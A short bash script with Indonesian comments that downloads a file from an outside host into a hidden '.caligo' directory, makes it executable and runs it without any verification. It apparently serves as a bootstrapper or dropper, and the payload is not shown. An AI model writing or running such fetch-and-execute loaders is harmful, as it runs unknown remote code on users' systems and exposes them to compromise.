#!/bin/bash

# URL file yang akan diunduh
file_url="https://caligo.asia/cdn/Tiqe7/Vebanoro56.x/download"

# Nama file hasil unduhan
downloaded_file=".caligo/boot.sh"

# Membuat direktori .caligo jika belum ada
mkdir -p "$(dirname "$downloaded_file")"

# Memeriksa apakah file sudah ada
if [ -f "$downloaded_file" ]; then
    echo "File sudah ada. Menjalankan file..."
    chmod +x "$downloaded_file"  # Memberikan izin eksekusi
    ./"$downloaded_file"         # Menjalankan file
else
    echo "Mengunduh file dari $file_url..."
    curl -o "$downloaded_file" "$file_url"
    
    # Memeriksa apakah pengunduhan berhasil
    if [ $? -eq 0 ]; then
        echo "Pengunduhan berhasil. Menjalankan file..."
        chmod +x "$downloaded_file"  # Memberikan izin eksekusi
        ./"$downloaded_file"         # Menjalankan file
    else
        echo "Pengunduhan gagal."
    fi
fi

echo "Selesai."
